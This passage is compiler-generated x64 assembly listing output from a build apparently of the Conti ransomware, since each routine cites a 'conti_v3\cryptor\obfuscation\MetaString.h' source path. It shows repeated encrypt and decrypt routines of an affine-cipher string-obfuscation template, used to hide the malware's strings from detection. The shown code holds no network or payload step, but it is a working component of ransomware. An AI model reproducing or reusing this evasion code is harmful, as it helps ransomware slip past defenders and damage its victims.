  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0L@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<11,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0L@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0L@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ PROC ; MetaBuffer<11,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0L@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<11,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$02$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$02$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<3,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 5c 00 00 00	 mov	 ecx, 92			; 0000005cH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2a	 imul	 r8d, ecx, 42		; 0000002aH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$02$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<3,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$02$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$02$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<3,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 40 2e	 lea	 r8d, DWORD PTR [rax+46]
  00007	46 8d 04 40	 lea	 r8d, DWORD PTR [rax+r8*2]
  0000b	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$02$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<3,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$02$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$02$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<3,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$02$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<3,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BH@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BH@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z PROC ; MetaBuffer<23,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 37 00 00 00	 mov	 ecx, 55			; 00000037H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 0b	 imul	 r8d, ecx, 11

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BH@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<23,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BH@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BH@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z PROC ; MetaBuffer<23,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 17	 imul	 r8d, eax, 23
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 37	 add	 r8d, 55			; 00000037H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BH@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<23,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BH@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BH@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEBA_NXZ PROC ; MetaBuffer<23,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BH@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<23,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GF@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 2e 00 00 00	 mov	 ecx, 46			; 0000002eH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2c	 imul	 r8d, ecx, 44		; 0000002cH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GF@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GF@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 65	 imul	 r8d, eax, 101		; 00000065H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 2e	 add	 r8d, 46			; 0000002eH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GF@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GF@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GF@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ PROC ; MetaBuffer<101,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GF@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<101,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FD@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0FD@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<83,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 17 00 00 00	 mov	 ecx, 23
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 1a	 imul	 r8d, ecx, 26

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FD@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<83,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0FD@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0FD@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<83,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 53	 imul	 r8d, eax, 83		; 00000053H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 17	 add	 r8d, 23
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0FD@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<83,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0FD@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0FD@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<83,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0FD@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<83,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0HB@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0HB@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<113,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 46	 sub	 eax, 70			; 00000046H
  00006	44 8d 04 c0	 lea	 r8d, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0HB@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<113,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0HB@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0HB@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<113,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 71	 imul	 r8d, eax, 113		; 00000071H
